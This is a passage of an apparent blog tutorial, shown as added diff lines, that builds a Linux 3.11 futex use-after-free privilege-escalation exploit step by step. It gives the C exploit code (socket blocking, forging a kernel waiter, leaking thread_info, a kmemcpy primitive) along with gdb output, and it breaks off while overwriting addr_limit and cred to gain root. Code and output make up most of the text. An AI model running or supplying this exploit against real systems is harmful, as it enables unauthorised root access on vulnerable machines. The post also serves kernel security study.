+This would help us in estimating which syscall we should use in order to write to the waiter’s address space.</p>
+
+<p>We enforce two limitations on the system call we’re looking for.</p>
+<ol>
+  <li>It is deep enough in order to overlap with our dangling <code class="language-plaintext highlighter-rouge">rt_waiter</code>.</li>
+  <li>The local variable within the function that overlaps <code class="language-plaintext highlighter-rouge">rt_waiter</code> is controllable.</li>
+</ol>
+
+<p>The syscalls <code class="language-plaintext highlighter-rouge">sendmsg</code>, <code class="language-plaintext highlighter-rouge">recvmsg</code>, and <code class="language-plaintext highlighter-rouge">sendmmsg</code> are the adjacent functions to <code class="language-plaintext highlighter-rouge">futex_wait_requeue_pi</code> in terms of stack usage.<br />
+That should be a good place to start.
+We’ll be using <code class="language-plaintext highlighter-rouge">sendmmsg</code> throughout the exploit.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Breakpoint 1, futex_wait_requeue_pi (uaddr=uaddr@entry=0x80ff44c, flags=flags@entry=0x1, val=val@entry=0x0,
+    abs_time=abs_time@entry=0x0, uaddr2=uaddr2@entry=0x80ff450, bitset=0xffffffff) at kernel/futex.c:2285
+
+(gdb) set $waiter = &amp;rt_waiter
+
+Breakpoint 2, ___sys_sendmsg (sock=sock@entry=0xc5dfea80, msg=msg@entry=0x80ff420, msg_sys=msg_sys@entry=0xc78cbef4,
+    flags=flags@entry=0x0, used_address=used_address@entry=0xc78cbf10) at net/socket.c:1979
+
+(gdb) p $waiter
+$12 = (struct rt_mutex_waiter *) 0xc78cbe2c
+
+(gdb) p &amp;iovstack
+$11 = (struct iovec (*)[8]) 0xc78cbe08
+
+(gdb) p sizeof(iovstack)
+$13 = 0x40
+
+(gdb) p &amp;iovstack &lt; $waiter &lt; (char*)&amp;iovstack + sizeof(iovstack)
+$14 = 0x1 (True)
+</code></pre></div></div>
+<p>I set two breakpoints, at <a href="https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L2285"><code class="language-plaintext highlighter-rouge">futex_wait_requeue_pi()</code></a> and <a href="https://elixir.bootlin.com/linux/v3.11.4/source/net/socket.c#L1976"><code class="language-plaintext highlighter-rouge">___sys_sendmsg()</code></a> in order to understand what arguments should we pass to the <code class="language-plaintext highlighter-rouge">sendmmsg</code> syscall
+so that <code class="language-plaintext highlighter-rouge">rt_waiter</code> is under our control.</p>
+
+<p>When the breakpoint hits on <a href="https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L2285"><code class="language-plaintext highlighter-rouge">futex_wait_requeue_pi()</code></a>, I do nothing besides storing the address of <code class="language-plaintext highlighter-rouge">rt_waiter</code> in <code class="language-plaintext highlighter-rouge">$waiter</code>.
+When it hits on <a href="https://elixir.bootlin.com/linux/v3.11.4/source/net/socket.c#L1976"><code class="language-plaintext highlighter-rouge">___sys_sendmsg()</code></a>, I check for the address of the local variable <code class="language-plaintext highlighter-rouge">iovstack</code>, which is of type <code class="language-plaintext highlighter-rouge">struct iovec[8]</code>, and examine its size.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><strong>Variable</strong></td>
+      <td><strong>Address</strong></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">rt_waiter</code></td>
+      <td><code class="language-plaintext highlighter-rouge">0xc78cbe2c</code></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">iovstack</code></td>
+      <td><code class="language-plaintext highlighter-rouge">0xc78cbe08</code> - <code class="language-plaintext highlighter-rouge">0xc78cbe48</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Proved <code class="language-plaintext highlighter-rouge">futex_wait_requeue_pi:rt_waiter</code> overlaps with <code class="language-plaintext highlighter-rouge">___sys_sendmsg:iovstack</code>.</p>
+
+<p>Let’s take a look at <code class="language-plaintext highlighter-rouge">sendmmsg</code>’s signature.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">sendmmsg</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">mmsghdr</span> <span class="o">*</span><span class="n">msgvec</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">vlen</span><span class="p">,</span>
+                    <span class="kt">int</span> <span class="n">flags</span><span class="p">);</span>
+
+<span class="k">struct</span> <span class="n">mmsghdr</span>
+<span class="p">{</span>
+	<span class="k">struct</span> <span class="n">msghdr</span> <span class="n">msg_hdr</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">msg_len</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="k">struct</span> <span class="n">msghdr</span>
+<span class="p">{</span>
+	<span class="kt">void</span> <span class="o">*</span><span class="n">msg_name</span><span class="p">;</span>
+	<span class="n">socklen_t</span> <span class="n">msg_namelen</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="n">iovec</span> <span class="o">*</span><span class="n">msg_iov</span><span class="p">;</span> <span class="c1">// &lt;-- iovstack</span>
+	<span class="kt">size_t</span> <span class="n">msg_iovlen</span><span class="p">;</span>
+	<span class="kt">void</span> <span class="o">*</span><span class="n">msg_control</span><span class="p">;</span>
+	<span class="kt">size_t</span> <span class="n">msg_controllen</span><span class="p">;</span>
+	<span class="kt">int</span> <span class="n">msg_flags</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="k">struct</span> <span class="n">iovec</span>
+<span class="p">{</span>
+	<span class="kt">void</span> <span class="o">*</span><span class="n">iov_base</span><span class="p">;</span>
+	<span class="kt">size_t</span> <span class="n">iov_len</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>At this point I suggest understanding the syscall itself.</p>
+<blockquote>
+  <p>The sendmmsg() system call is an extension of sendmsg(2) that
+  allows the caller to transmit multiple messages on a socket using
+  a single system call.  (This has performance benefits for some
+  applications.)</p>
+</blockquote>
+
+<p>The arguments are pretty trivial and essentially the same as <code class="language-plaintext highlighter-rouge">sendmsg</code> only that there’s <code class="language-plaintext highlighter-rouge">mmsghdr</code> that can contain multiple <code class="language-plaintext highlighter-rouge">msghdr</code>.<br />
+If you’re unfamiliar with the syscall, give it a read at <a href="https://man7.org/linux/man-pages/man2/sendmmsg.2.html"><code class="language-plaintext highlighter-rouge">man sendmmsg(2)</code></a>.</p>
+
+<p>In order to invoke <code class="language-plaintext highlighter-rouge">sendmmsg</code> successfully, we’d need a pair of connected sockets that we can send the data to.
+It is very important to understand that we want <a href="https://elixir.bootlin.com/linux/v3.11.4/source/net/socket.c#L1976"><code class="language-plaintext highlighter-rouge">___sys_sendmsg()</code></a> to <strong>block</strong> so that we can take advantage of the waiter’s corrupted state while it’s under our control.</p>
+
+<p>Typically, the function sends the data over the socket and exits.
+In order to make it block, we’d need to use <code class="language-plaintext highlighter-rouge">SOCK_STREAM</code> as our socket type which provides a <em>reliable connection-based</em> byte stream.
+This grants us the blocking capabilities we’ve talked about.
+On top of that, we’d need to fill up the “send buffer” so that data can’t be sent over the socket, unless data is read on the other end.</p>
+
+<p>I’ve crafted a function that does just that.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define BLOCKBUF "AAAAAAAA"
+#define BLOCKBUFLEN strlen(BLOCKBUF)
+</span>
+<span class="kt">int</span> <span class="n">client_sockfd</span><span class="p">,</span> <span class="n">server_sockfd</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">setup_sockets</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">fds</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="n">USERLOG</span> <span class="s">"Creating a pair of sockets for kernel stack modification using blocking I/O."</span><span class="p">);</span>
+
+    <span class="n">assert</span><span class="p">(</span><span class="o">!</span><span class="n">socketpair</span><span class="p">(</span><span class="n">AF_UNIX</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">fds</span><span class="p">));</span>
+
+    <span class="n">client_sockfd</span> <span class="o">=</span> <span class="n">fds</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+    <span class="n">server_sockfd</span> <span class="o">=</span> <span class="n">fds</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+
+    <span class="k">while</span> <span class="p">(</span><span class="n">send</span><span class="p">(</span><span class="n">client_sockfd</span><span class="p">,</span> <span class="n">BLOCKBUF</span><span class="p">,</span> <span class="n">BLOCKBUFLEN</span><span class="p">,</span> <span class="n">MSG_DONTWAIT</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+        <span class="p">;</span>
+    <span class="n">assert</span><span class="p">(</span><span class="n">errno</span> <span class="o">==</span> <span class="n">EWOULDBLOCK</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>The function creates a pair of UNIX sockets of type <code class="language-plaintext highlighter-rouge">SOCK_STREAM</code> and then
+sends <code class="language-plaintext highlighter-rouge">AAAAAAAA</code> over the socket untill the call to <code class="language-plaintext highlighter-rouge">send</code> fails with <code class="language-plaintext highlighter-rouge">EWOULDBLOCK</code> as the <code class="language-plaintext highlighter-rouge">errno</code>.
+Note the <code class="language-plaintext highlighter-rouge">MSG_DONTWAIT</code> flag that makes the <code class="language-plaintext highlighter-rouge">send</code> return immediately instead of blocking.</p>
+
+<blockquote>
+  <p>MSG_DONTWAIT<br />
+  Enables nonblocking operation; if the operation would block, EAGAIN or EWOULDBLOCK is returned.</p>
+</blockquote>
+
+<p>Afterwards we assert that <code class="language-plaintext highlighter-rouge">EWOULDBLOCK</code> is in fact the reason the operation failed.</p>
+
+<p>Next up, we’re ready for actually invoking our <code class="language-plaintext highlighter-rouge">sendmmsg</code> to overwrite <code class="language-plaintext highlighter-rouge">rt_waiter</code>. Exciting!</p>
+
+<p>For the sake of overwriting the waiter’s list entries properly, which is what we’re interested in,
+we’d need to align the <code class="language-plaintext highlighter-rouge">iovstack</code> in kernelspace, which is the <code class="language-plaintext highlighter-rouge">iovec</code> in userspace accordingly.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define COUNT_OF(arr) (sizeof(arr) / sizeof(arr[0]))
+</span>
+<span class="k">struct</span> <span class="n">mmsghdr</span> <span class="n">msgvec</span><span class="p">;</span>
+<span class="k">struct</span> <span class="n">iovec</span> <span class="n">msg</span><span class="p">[</span><span class="mi">7</span><span class="p">];</span>
+
+<span class="kt">void</span> <span class="nf">setup_msgs</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">COUNT_OF</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="mh">0x41414141</span><span class="p">;</span>
+        <span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mh">0xace</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">msgvec</span><span class="p">.</span><span class="n">msg_hdr</span><span class="p">.</span><span class="n">msg_iov</span> <span class="o">=</span> <span class="n">msg</span><span class="p">;</span>
+    <span class="n">msgvec</span><span class="p">.</span><span class="n">msg_hdr</span><span class="p">.</span><span class="n">msg_iovlen</span> <span class="o">=</span> <span class="n">COUNT_OF</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>In this function I setup the messages, the <code class="language-plaintext highlighter-rouge">iovec</code>, in the hope that it would overwrite the waiter’s struct once I call <code class="language-plaintext highlighter-rouge">sendmmsg</code>.
+Once again, I’ve placed two breakpoints at <a href="https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L2285"><code class="language-plaintext highlighter-rouge">futex_wait_requeue_pi()</code></a> and <a href="https://elixir.bootlin.com/linux/v3.11.4/source/net/socket.c#L1976"><code class="language-plaintext highlighter-rouge">___sys_sendmsg()</code></a>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Breakpoint 1, futex_wait_requeue_pi (uaddr=uaddr@entry=0x80ff44c, flags=flags@entry=0x1, val=val@entry=0x0,
+    abs_time=abs_time@entry=0x0, uaddr2=uaddr2@entry=0x80ff450, bitset=0xffffffff) at kernel/futex.c:2285
+(gdb) set $waiter = &amp;rt_waiter
+(gdb) cont
+Continuing.
+
+Breakpoint 3, ___sys_sendmsg (sock=sock@entry=0xc5dfda80, msg=msg@entry=0x80ff420, msg_sys=msg_sys@entry=0xc78cfef4,
+    flags=flags@entry=0x0, used_address=used_address@entry=0xc78cff10) at net/socket.c:1979
+
+(gdb) fin
+Run till exit from #0  ___sys_sendmsg (sock=sock@entry=0xc5dfda80, msg=msg@entry=0x80ff420, msg_sys=msg_sys@entry=0xc78cfef4,
+    flags=flags@entry=0x0, used_address=used_address@entry=0xc78cff10) at net/socket.c:1979
+^C
+Program received signal SIGINT, Interrupt.
+(gdb) p *$waiter
+$26 = {
+  list_entry = {
+    prio = 0xace,
+    prio_list = {
+      next = 0x41414141,
+      prev = 0xace
+    },
+    node_list = {
+      next = 0x41414141,
+      prev = 0xace
+    }
+    ...
+}
+</code></pre></div></div>
+<p>There are many interesting things to look at from this experiment. Let’s go over it.</p>
+
+<p>Just as before, I store <code class="language-plaintext highlighter-rouge">rt_waiter</code>’s address. Upon <code class="language-plaintext highlighter-rouge">___sys_sendmmsg</code> I continue the execution until the function is about to exit.
+However, because the function is blocking, I have to interrupt the debugger with a <code class="language-plaintext highlighter-rouge">^C</code>.
+Once the function blocks, it had already filled the <code class="language-plaintext highlighter-rouge">iovstack</code>.
+After I do that, I browse the waiter struct and I see that the overwrite occured just as I wanted it to.</p>
+
+<p><img src="https://i.imgur.com/npV3oAT.png" alt="Waiter Overwritten Image" /></p>
+<p style="text-align: center; font-style: italic"><small>(In reality there's only a single waiter)</small></p>
+
+<p>That’s great! We can now overwrite the dangling waiter’s memory.</p>
+
+<p>Let’s review this as a whole within the the exploit code.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="o">*</span><span class="nf">forge_waiter</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="n">USERLOG</span> <span class="s">"Placing the fake waiter on the dangling node within the mutex's waiters list."</span><span class="p">);</span>
+
+    <span class="n">setup_msgs</span><span class="p">();</span>
+    <span class="n">setup_sockets</span><span class="p">();</span>
+    <span class="n">assert</span><span class="p">(</span><span class="o">!</span><span class="n">fwait_requeue</span><span class="p">(</span><span class="o">&amp;</span><span class="n">non_pi_futex</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi_futex</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
+    <span class="n">assert</span><span class="p">(</span><span class="o">!</span><span class="n">sendmmsg</span><span class="p">(</span><span class="n">client_sockfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">msgvec</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">pthread_t</span> <span class="n">forger</span><span class="p">,</span> <span class="n">ref_holder</span><span class="p">;</span>
+
+    <span class="n">lock_pi_futex</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="n">assert</span><span class="p">(</span><span class="o">!</span><span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">forger</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">forge_waiter</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">));</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+
+    <span class="n">assert</span><span class="p">(</span><span class="n">frequeue</span><span class="p">(</span><span class="o">&amp;</span><span class="n">non_pi_futex</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi_futex</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">);</span>
+
+    <span class="n">assert</span><span class="p">(</span><span class="o">!</span><span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ref_holder</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">lock_pi_futex</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">));</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+
+    <span class="n">pi_futex</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">frequeue</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pi_futex</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi_futex</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>We’ve already reviewed <code class="language-plaintext highlighter-rouge">setup_msg()</code>, <code class="language-plaintext highlighter-rouge">setup_sockets()</code>, and <code class="language-plaintext highlighter-rouge">fwait_requeue()</code> would block until the self-requeue is triggered.
+First thing when it exits, <code class="language-plaintext highlighter-rouge">sendmmsg()</code> is called to overwrite the waiter, which also blocks.</p>
+
+<p>You could see that I create another thread called <code class="language-plaintext highlighter-rouge">ref_holder</code> which also attempts to lock <code class="language-plaintext highlighter-rouge">pi_futex</code> which in turns forms another waiter instance.
+The reason this is needed is because the state of the futex would get destroyed if there aren’t any contending waiters on the lock.</p>
+
+<h1 id="kernel-infoleak">Kernel Infoleak</h1>
+<p>Our next goal would be to leak an address that would help us target the <a href="https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/sched.h#L1027"><code class="language-plaintext highlighter-rouge">task_struct</code></a> of our process which contains its <a href="https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/cred.h#L102"><code class="language-plaintext highlighter-rouge">cred</code></a>
+so that we can overwrite it later to gain <code class="language-plaintext highlighter-rouge">root</code> privileges.</p>
+
+<p>The way we go about doing it is using a fake waiter and when we’d attempt to lock the futex once again,
+another waiter would be added to the waiters list which would result in writing to the adjacent nodes which would be under our control.
+Once that happens, we’d be able to inspect the kernel address from userspace via the fake waiter list nodes.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define DEFAULT_PRIO 120
+#define THREAD_INFO_BASE 0xffffe000
+</span>
+<span class="k">struct</span> <span class="n">rt_mutex_waiter</span> <span class="n">fake_waiter</span><span class="p">,</span> <span class="n">leaker_waiter</span><span class="p">;</span>
+<span class="n">pthread_t</span> <span class="n">corrupter</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">link_fake_leaker_waiters</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">fake_waiter</span><span class="p">.</span><span class="n">list_entry</span><span class="p">.</span><span class="n">node_list</span><span class="p">.</span><span class="n">prev</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">leaker_waiter</span><span class="p">.</span><span class="n">list_entry</span><span class="p">.</span><span class="n">node_list</span><span class="p">;</span>
+    <span class="n">fake_waiter</span><span class="p">.</span><span class="n">list_entry</span><span class="p">.</span><span class="n">prio_list</span><span class="p">.</span><span class="n">prev</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">leaker_waiter</span><span class="p">.</span><span class="n">list_entry</span><span class="p">.</span><span class="n">prio_list</span><span class="p">;</span>
+    <span class="n">fake_waiter</span><span class="p">.</span><span class="n">list_entry</span><span class="p">.</span><span class="n">prio</span> <span class="o">=</span> <span class="n">DEFAULT_PRIO</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">leak_thread_info</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">link_fake_leaker_waiters</span><span class="p">();</span>
+    <span class="n">assert</span><span class="p">(</span><span class="o">!</span><span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">corrupter</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">lock_pi_futex</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">));</span>
+
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="n">corrupter_thread_info</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">thread_info</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">leaker_waiter</span><span class="p">.</span><span class="n">list_entry</span><span class="p">.</span><span class="n">prio_list</span><span class="p">.</span><span class="n">next</span> <span class="o">&amp;</span> <span class="n">THREAD_INFO_BASE</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="n">USERLOG</span> <span class="s">"Corrupter's thread_info @ %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">corrupter_thread_info</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Let’s first address what’s called a “Thread Info”.<br />
+<a href="https://elixir.bootlin.com/linux/v3.11.4/source/arch/x86/include/asm/thread_info.h#L25"><code class="language-plaintext highlighter-rouge">thread_info</code></a> is a thread descriptor that is held within the kernel and is placed on the stack’s address space.
+For each thread that we create using <code class="language-plaintext highlighter-rouge">pthread_create()</code> a new <a href="https://elixir.bootlin.com/linux/v3.11.4/source/arch/x86/include/asm/thread_info.h#L25"><code class="language-plaintext highlighter-rouge">thread_info</code></a> is generated in the kernel.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">thread_info</span> <span class="p">{</span>
+	<span class="k">struct</span> <span class="n">task_struct</span>	<span class="o">*</span><span class="n">task</span><span class="p">;</span>		<span class="cm">/* main task structure */</span>
+	<span class="k">struct</span> <span class="n">exec_domain</span>	<span class="o">*</span><span class="n">exec_domain</span><span class="p">;</span>	<span class="cm">/* execution domain */</span>
+	<span class="n">__u32</span>			<span class="n">flags</span><span class="p">;</span>		<span class="cm">/* low level flags */</span>
+	<span class="n">__u32</span>			<span class="n">status</span><span class="p">;</span>		<span class="cm">/* thread synchronous flags */</span>
+	<span class="n">__u32</span>			<span class="n">cpu</span><span class="p">;</span>		<span class="cm">/* current CPU */</span>
+	<span class="kt">int</span>			<span class="n">preempt_count</span><span class="p">;</span>	<span class="cm">/* 0 =&gt; preemptable,
+						   &lt;0 =&gt; BUG */</span>
+	<span class="n">mm_segment_t</span>		<span class="n">addr_limit</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="n">restart_block</span>    <span class="n">restart_block</span><span class="p">;</span>
+	<span class="kt">void</span> <span class="n">__user</span>		<span class="o">*</span><span class="n">sysenter_return</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">int</span>		<span class="n">sig_on_uaccess_error</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">int</span>		<span class="n">uaccess_err</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span>	<span class="cm">/* uaccess failed */</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>The reason it interests us is because it’s relatively easy to get its address once you have a leak,
+and the more interesting reason is that it contains a pointer to the process’ <a href="https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/sched.h#L1027"><code class="language-plaintext highlighter-rouge">task_struct</code></a>.
+Just to clarify, a new <a href="https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/sched.h#L1027"><code class="language-plaintext highlighter-rouge">task_struct</code></a> is also created for each thread.</p>
+
+<p>In order to do the actual leak, we link together two fake waiters.
+One is named <code class="language-plaintext highlighter-rouge">fake_waiter</code> which is used for general list corruption,
+and the other is called <code class="language-plaintext highlighter-rouge">leaker_waiter</code> because its sole usage is to leak addresses through.</p>
+
+<p>By linking I mean in practice that we set the previous node of the <code class="language-plaintext highlighter-rouge">fake_waiter</code> to be the <code class="language-plaintext highlighter-rouge">leaker_waiter</code>,
+and set its priority to be the default priority of a task plus one so that it’ll place itself after the <code class="language-plaintext highlighter-rouge">leaker_waiter</code>.
+Priority is a value that correlates to the process’ niceness.</p>
+
+<p><img src="https://i.imgur.com/5HtvkBq.png" alt="Crafted Waiter Image" /></p>
+<p style="text-align: center; font-style: italic"><small>Those aren't the actual priorities but the idea remains.</small></p>
+
+<p>After we’ve linked the waiters in userspace,
+we call <code class="language-plaintext highlighter-rouge">lock_pi_futex()</code> on another thread so that a waiter is created which attempts to add itself into the list.
+Naturally, once a node is added into a list, it writes to its adjacent nodes, in our case to <code class="language-plaintext highlighter-rouge">leaker_waiter</code>.</p>
+
+<p><img src="https://i.imgur.com/uAJDaJF.png" alt="New Waiter Image" /></p>
+
+<p>Awesome! We’ve leaked a kernel stack address of one of the threads in our program.</p>
+
+<p>In order to target its <a href="https://elixir.bootlin.com/linux/v3.11.4/source/arch/x86/include/asm/thread_info.h#L25"><code class="language-plaintext highlighter-rouge">thread_info</code></a>, all we have to do is AND its address with <code class="language-plaintext highlighter-rouge">THREAD_INFO_BASE</code>.
+You can see that from <a href="https://elixir.bootlin.com/linux/v3.11.4/source/arch/x86/include/asm/thread_info.h#L174"><code class="language-plaintext highlighter-rouge">current_thread_info()</code></a>’s implementation, though that might vary across different architectures.
+Here’s the source for x86.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* how to get the thread information struct from C */</span>
+<span class="k">static</span> <span class="kr">inline</span> <span class="k">struct</span> <span class="n">thread_info</span> <span class="o">*</span><span class="nf">current_thread_info</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">return</span> <span class="p">(</span><span class="k">struct</span> <span class="n">thread_info</span> <span class="o">*</span><span class="p">)</span>
+		<span class="p">(</span><span class="n">current_stack_pointer</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="n">THREAD_SIZE</span> <span class="o">-</span> <span class="mi">1</span><span class="p">));</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>We have a hold of the <code class="language-plaintext highlighter-rouge">thread_info</code> location in memory.</p>
+
+<h1 id="overwriting-address-limit">Overwriting Address Limit</h1>
+
+<p>Just as we can read by corrupting the list, we can utilize the same technique in order to use it for writing purposes.
+The first memory area that we’ll be targeting is what’s called the “Address Limit”.</p>
+
+<p>It lays under <code class="language-plaintext highlighter-rouge">thread_info.addr_limit</code> as you can see in <a href="https://elixir.bootlin.com/linux/v3.11.4/source/arch/x86/include/asm/thread_info.h#L25"><code class="language-plaintext highlighter-rouge">thread_info</code></a> above.
+It is used for limiting the virtual address space that is reserved for the user.
+When the kernel works with user-provided addresses,
+it compares them to the thread’s <code class="language-plaintext highlighter-rouge">addr_limit</code> in order to verify that it’s a valid userspace address.
+If the supplied address is smaller than <code class="language-plaintext highlighter-rouge">addr_limit</code>, the designated memory area is in fact from userspace.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">addr_limit</code> is an excellent target for initial kernel overwrite because once you overwrite it with <code class="language-plaintext highlighter-rouge">0xffffffff</code>,
+you have gotten full arbitrary read and write capabilities to kernel memory.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">kmemcpy</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">src</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">dst</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">pipefd</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+
+    <span class="n">assert</span><span class="p">(</span><span class="o">!</span><span class="n">pipe</span><span class="p">(</span><span class="n">pipefd</span><span class="p">));</span>
+    <span class="n">assert</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">pipefd</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">src</span><span class="p">,</span> <span class="n">len</span><span class="p">)</span> <span class="o">==</span> <span class="n">len</span><span class="p">);</span>
+    <span class="n">assert</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">pipefd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">dst</span><span class="p">,</span> <span class="n">len</span><span class="p">)</span> <span class="o">==</span> <span class="n">len</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">escalate_priv_sighandler</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">corrupter_task</span><span class="p">,</span> <span class="o">*</span><span class="n">main_task</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">cred</span> <span class="o">*</span><span class="n">main_cred</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">root_id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
